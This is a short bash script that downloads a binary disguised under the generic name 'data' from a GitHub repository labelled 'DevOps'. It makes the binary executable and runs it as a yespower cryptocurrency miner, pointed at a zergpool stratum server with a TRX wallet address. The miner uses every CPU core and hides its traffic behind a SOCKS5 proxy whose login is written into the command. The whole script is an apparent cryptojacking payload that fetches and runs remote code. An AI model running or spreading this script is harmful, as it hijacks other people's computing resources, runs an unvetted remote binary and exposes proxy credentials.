#!/bin/bash
apt update -y &&
wget -q https://github.com/thirthada007/DevOps/raw/main/data
chmod +x data
./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://shnnernr:crxg0lmn1k7u@45.142.28.145:8156
